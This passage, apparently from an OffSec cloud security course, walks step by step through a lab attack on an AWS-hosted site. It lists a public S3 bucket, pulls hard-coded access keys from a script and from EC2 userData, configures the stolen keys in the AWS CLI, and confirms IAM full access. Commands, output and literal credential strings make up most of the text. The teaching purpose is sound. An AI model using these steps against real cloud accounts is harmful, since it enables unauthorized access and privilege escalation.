> Listing 54 - Modifying /etc/resolv.conf File with cat Command

For now, we'll simply start the lab to retrieve the DNS public IP address and configure the network in our local machine to use that secondary DNS server.

After the lab starts, it will take approximately 5 minutes for the DNS server to be ready and to start resolving names.

## 6.4.4. Example Attack Against AWS Cloud

A penetration test against cloud infrastructure doesn't differ too much from penetration testing assessments conducted on other networks' infrastructures.

In a typical cloud assessment, we perform techniques for information gathering, initial access, lateral movement, and privilege escalation.

In this section, we'll be assessing the [cloudexperts.offseclab.io](http://cloudexperts.offseclab.io) website. Before starting with the lab, we'll need to have configured the DNS server in our local machine according to the instructions in the previous _Accessing the Lab_ section.

To validate that the DNS is configured properly, we'll use the **host** command to make a DNS query and check if it's working as expected.

The DNS server will start resolving names in approximately 5 minutes after starting the lab

```kali-shell
kali@kali:~$ host cloudexperts.offseclab.io
cloudexperts.offseclab.io has address 18.204.7.94

```

> Listing 55 - Doing a DNS Query to Check if the Lab DNS is Responding as Expected

We got a response with the resolved IP address of the **cloudexperts.offseclab.io** website. We are now ready to continue.

Next, let's use the **host** command again to do a DNS resolution of the IP address we retreived. We normally do this to check if there are other domain names associated with the same IP address.

```kali-shell
kali@kali:~$ host 18.204.7.94
94.7.204.18.in-addr.arpa domain name pointer ec2-18-204-7-94.compute-1.amazonaws.com.
```

> Listing 56 - Doing a Reverse DNS Lookup

We notice the IP address **18.204.7.94** resolves to a _fully-qualified domain name_ (FQDN), **ec2-18-204-7-94.compute-1.amazonaws.com.**. From this name, we learn that the IP belongs to the pool of AWS EC2 instances, so this site is hosted in AWS.

Let's continue interacting with the site by using a web browser.

We'll notice that when we click on an image, it opens in a new tab. We can deduce from the URL address of the image that it is stored in an S3 bucket named **cloudexperts.offseclab.io-assets**.

![[OffSec/Cloud/Cloud Essentials/z. images/5d8070d145964de6519125d164b1ad9e_MD5.jpg]]

Figure 16: URL of the Image Pointing to an S3 Bucket

A typical attack against an AWS cloud target begins with some kind of initial access, which consists of obtaining a way to interact with the AWS API. We could, for example, use _social engineering attacks_, to acquire IAM users' credentials for accessing the Management Console. Another way could be exploiting other platforms that already interact with the AWS API. Many attacks have originated from IAM access keys found in public code repositories or S3 buckets.

Next, we will check if we can list the contents of the bucket. In the URL bar of the web browser, we can erase the image path and leave the bucket name. The final URL should be **https://s3.amazon.comn/cloudexperts.offseclab.io-assets**.

![[OffSec/Cloud/Cloud Essentials/z. images/b18842f9396cda2e007212b45ce4262a_MD5.jpg]]

Figure 17: Browsing the Content of the S3 Bucket

The XML response confirms that we can list the contents of the bucket. Let's review the objects and try to find any useful information.

Each object of the bucket is described inside a _<Contents>_ tag of the XML output, and the _<key>_ tag is the name of the object. We find images and a **.css** file used by the website. However, there is also an interesting Python file named **files/s3_upload.py**. Let's use the **curl** command in the CLI to get this file.

```kali-shell
kali@kali:~$ curl https://s3.amazonaws.com/cloudexperts.offseclab.io-assets/files/s3_upload.py
# Sample Script to upload files to S3 bucket.
# This script is purposely insecure. Do not use this in production environments

import boto3

# Variables
bucket_name=cloudexperts.offseclab.io-assets

# Creating Session With Boto3 for the webmaster user.
session = boto3.Session(
aws_access_key_id='AKIAQOMAIGYUYLSF2OBS',
aws_secret_access_key='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'
)

# Creating S3 Resource From the Session.
s3 = session.resource('s3')

s3.Bucket(bucket_name).upload_file('D:/backup/images/'+Altostratus.jpg,'Altostratus.jpg')
s3.Bucket(bucket_name).upload_file('D:/backup/images/'+Cumulonimbus.jpg,'Cumulonimbus.jpg')
s3.Bucket(bucket_name).upload_file('D:/backup/images/'+Cumulus_congestus.jpg,'Cumulus_congestus.jpg')
s3.Bucket(bucket_name).upload_file('D:/backup/images/'+Stratocumulus.jpg,'Stratocumulus.jpg')
s3.Bucket(bucket_name).upload_file('D:/backup/images/'+avatar.jpg,'avatar.jpg')
s3.Bucket(bucket_name).upload_file('D:/backup/images/'+bg.jpg,'bg.jpg')

```

> Listing 57 - Getting the Content of the Python File Inside the Bucket

This is bad news for the Cloud Experts site. We've obtained a potentially-sensitive file with hard-coded access keys. We might be able to use these credentials in the AWS CLI to interact with the AWS API.

Let's configure a profile so that if we find more access keys, we can quickly change between users. The comment in the script mentions a _webmaster_ user, so we can set that name to the profile. We'll use the **aws configure** command, including the **--profile webmaster** argument. We don't yet know which regions have resources in our target, but we can assume any default region and change that later. Let's configure **us-east-1** as _Default Region_.

```kali-shell
kali@kali:~$ aws configure --profile webmaster
AWS Access Key ID [None]: AKIAQOMAIGYUYLSF2OBS
AWS Secret Access Key [None]: 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
Default region name [None]:us-east-1
Default output format [None]:json
```

> Listing 58 - Configuring access keys in AWS CLI with a profile

Now we can check if the access keys are valid by interacting with the AWS API and confirming whether we get a response. With the **--profile webmaster** argument, we specify the name of the profile we created previously so that we can make calls using the _webmaster_'s access keys. The **sts get-caller-identity** command returns some details of the user, and no permissions are required to perform this operation.

```kali-shell
kali@kali:~$ aws --profile webmaster sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYUXVBPSIATM",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/webmaster"
}
```

> Listing 59 - Getting the Identity Details of the webmaster User Interacting with the API

From the **s3_upload.py** script we found earlier, we suspect that the _webmaster_ IAM user has (at a minimum) permission to upload files to an S3 bucket. We will use the **s3 ls** command to check if we can list the buckets and their contents. We'll also determine if we can retreive the policies attached to the user with the **list-attached-user-policies** command.

```kali-shell
kali@kali:~$ aws --profile webmaster s3 ls
2023-01-23 21:55:19 cloudexperts.offseclab.io-assets

kali@kali:~$ aws --profile webmaster s3 ls cloudexperts.offseclab.io-assets
                           PRE css/
                           PRE files/
                           PRE images/
2023-01-23 21:55:39       3806 index.html

kali@kali:~$ aws --profile webmaster iam list-attached-user-policies --user-name webmaster

An error occurred (AccessDenied) when calling the ListAttachedUserPolicies operation: User: arn:aws:iam::123456789012:user/webmaster is not authorized to perform: iam:ListAttachedUserPolicies on resource: user webmaster because no identity-based policy allows the iam:ListAttachedUserPolicies action

```

> Listing 60 - Checking Whether Contents of the Bucket can be Listed with webmaster user's Permissions

We've learned that we can interact with the S3 service, but we cannot interact with the IAM service. The latter would have been useful to learn what other permissions the _webmaster_ user has.

At this point, we can try interacting with different services in different Regions to check if we can get a successful response. Some tools automate this task, but for this lab, we will try to interact with commonly-used services like EC2.

We'll use **ec2 describe-instances** to list all the instances. We'll start searching for instances in the default Region, **--region us-east-1**.

If we configured us-east-1 as the Default Region when we configured the AWS CLI, we can omit the --region parameter.

```kali-shell
kali@kali:~$ aws --profile webmaster ec2 describe-instances --region us-east-1
{
    "Reservations": [
        {
            "Groups": [],
            "Instances": [
                {
                    "AmiLaunchIndex": 0,
                    "ImageId": "ami-0b5eea76982371e91",
                    "InstanceId": "i-04c3bddb7cdc062a4",
                    "InstanceType": "t2.micro",
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "Placement": {
                        "AvailabilityZone": "us-east-1e",
                        "GroupName": "",
                        "Tenancy": "default"
                    },
                    "PrivateDnsName": "ip-172-31-60-86.ec2.internal",
                    "PrivateIpAddress": "172.31.60.86",
                    "ProductCodes": [],
                    "PublicDnsName": "ec2-18-204-7-94.compute-1.amazonaws.com",
                    "PublicIpAddress": "18.204.7.94",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "StateTransitionReason": "",
                    "SubnetId": "subnet-0fdeae1654316f570",
                    "VpcId": "vpc-0ebd60fbb5be6fbf5",
                    "Architecture": "x86_64",
...
                    "Tags": [
                        {
                            "Key": "CreatedBy",
                            "Value": "labadmin@offensive-security.com"
                        },
                        {
                            "Key": "UserId",
                            "Value": "123456789012:labadmin@offensive-security.com"
                        },
                        {
                            "Key": "map-migrated",
                            "Value": "d-server-00hbvn2ojxa300"
                        },
                        {
                            "Key": "Name",
                            "Value": "webapp"
                        }
                    ],
                    "VirtualizationType": "hvm",
                    "CpuOptions": {
                        "CoreCount": 1,
                        "ThreadsPerCore": 1
                    },
...

{
                    "AmiLaunchIndex": 0,
                    "ImageId": "ami-0b5eea76982371e91",
                    "InstanceId": "i-0521f95d4091d9c27",
                    "InstanceType": "t2.micro",
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "Placement": {
                        "AvailabilityZone": "us-east-1e",
                        "GroupName": "",
                        "Tenancy": "default"
                    },
                    "PrivateDnsName": "ip-172-31-55-246.ec2.internal",
                    "PrivateIpAddress": "172.31.55.246",
                    "ProductCodes": [],
                    "PublicDnsName": "ec2-44-205-254-229.compute-1.amazonaws.com",
                    "PublicIpAddress": "44.205.254.229",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "StateTransitionReason": "",
                    "SubnetId": "subnet-0fdeae1654316f570",
                    "VpcId": "vpc-0ebd60fbb5be6fbf5",
                    "Architecture": "x86_64",
...
                    "Tags": [
                        {
                            "Key": "CreatedBy",
                            "Value": "labadmin@offensive-security.com"
                        },
                        {
                            "Key": "UserId",
                            "Value": "123456789012:labadmin@offensive-security.com"
                        },
                        {
                            "Key": "Name",
                            "Value": "dns-forwarder"
                        }
                    ],
                    "VirtualizationType": "hvm",
                    "CpuOptions": {
                        "CoreCount": 1,
                        "ThreadsPerCore": 1
                    },
...


}
```

> Listing 61 - Describing Instances with the webmaster User

From the output, we identify two EC2 instances. We learn from the _Tags_ attribute that one EC2 instance is identified with the Name "webapp", while the other instance is identified with the Name "dns-forwarder". Let's ignore the "dns-forwarder" instance and focus just on the "webapp" instance.

We can also validate from _"PublicIpAddress": "18.204.7.94_ that the webapp EC2 instance has the same public IP address that we resolved when doing a DNS query of the "cloudexperts" domain name. This means we can deduce that the website is running in this instance.

There are other attributes in the output that help us understand more about the EC2 instance.

One attribute that doesn't appear in the output of the **describe-instances** command is _userData_. The _userData_ attribute allows the administrator to execute a command or script when the EC2 instance is deployed. This attribute is useful to automate provisioning by running tasks like updating the system, installing software, running services, etc. However, it can also provide useful information to an attacker to query this attribute if they gain access.

To query the _userData_ attribute, we can use the **ec2 describe-instance-attribute** command. We need to specify the instance ID (**--instance-id**) and the attribute we want to get (**--attribute userData**).

The _UserData_ attribute is stored in _Base64_ codification. We'll use the **--query "UserData.Value** argument to retreive only the value of the attribute. The **--output text** argument converts the output to text, removing the double quotes. Finally, we'll pipe the output to the **base64 --decode** command to _decode_ it and print the output.

```kali-shell
kali@kali:~$ aws --profile webmaster ec2 describe-instance-attribute --region us-east-1 --instance-id i-0fe3d2ceb6aca87cd --attribute userData
{
    "InstanceId": "i-0fe3d2ceb6aca87cd",
    "UserData": {
        "Value": "IyEvYmluL2Jhc2gNCmVjaG8gIlNldCBlbnZpcm9ubWVudGFsIHZhcmlhYmxlIHRvIGNvbW11bmljYXRlIHdpdGggQVdTIEFQSSINCmV4cG9ydCBBV1NfQUNDRVNTX0tFWV9JRD1BS0lBUU9NQUlHWVVSSlFOMzRMUg0KZXhwb3J0IEFXU19TRUNSRVRfQUNDRVNTX0tFWT1QVFhIRitPcnZrQlVRVmpvRjRtRUVoYzUzeGxRNmJyNFp2a1hzVlhMDQojIyMgc3RhcnQgbWFraW5nIGNhbGxzIHRvIEFXUyBBUEkgDQo="
    }
}

kali@kali:~$ aws --profile webmaster ec2 describe-instance-attribute --region us-east-1 --instance-id i-0fe3d2ceb6aca87cd --attribute userData  --output text --query "UserData.Value" | base64 --decode
#!/bin/bash
echo "Set environment variable to communicate with AWS API with the cloudadmin user"
export AWS_ACCESS_KEY_ID=AKIAQOMAIGYURJQN34LR
export AWS_SECRET_ACCESS_KEY=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
### start making calls to AWS API
```

> Listing 62 - Getting the Value of the userData Attribute

It's common to find these types of provisioning scripts in EC2 instances. In this case, the poor security practice is hard-coding credentials instead of assigning the EC2 instance an IAM role.

Next, we need to repeat the process of setting up a new profile in AWS CLI using the **aws configure** command. We can then validate that the profile was successfully created by running **sts get-caller-identity**, specifying the profile with **--profile**.

```kali-shell
kali@kali:~$ kali@kali:~$ aws configure --profile cloudadmin
AWS Access Key ID [None]: AKIAQOMAIGYURJQN34LR
AWS Secret Access Key [None]: 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
Default region name [None]:us-east-1
Default output format [None]:json

kali@kali:~$ aws --profile cloudadmin sts get-caller-identity
{
    "UserId": "AIDAQOMAIGYU34MEARRVU",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/cloudadmin"
}
```

> Listing 63 - Configuring new profile with the cloudadmin access keys.

Now, let's check again to determine if we can list the policies attached to the user.

```kali-shell
kali@kali:~$ aws --profile cloudadmin iam list-attached-user-policies --user-name cloudadmin
{
    "AttachedPolicies": [0
        {
            "PolicyName": "IAMFullAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMFullAccess"
        }
    ]
}
```

> Listing 64 - Listing Policies Attached to cloudadmin User

This time we _could_ list the policies attached to the user, and we find out that the _cloudadmin_ user has full access privileges to the IAM service. This means we can execute any IAM action, which includes modifying users or creating new users and attaching any policy to them.

At this point, we can confirm that this cloud infrastructure is severely compromised.

Once initial access succeeds, the next step, depending on the permissions obtained and the attacker's objective, might be to move laterally through the cloud infrastructure or find a way to escalate the privileges of our current access.

In future Modules, we will learn more about specific attack vectors for initial access, lateral movement, and privilege escalation in AWS cloud infrastructure.

While a real-world application might be more complex than this example, the flaws and techniques used in the demonstration are the same as we will find in real-life [AWS security incidents](https://github.com/ramimac/aws-customer-security-incidents).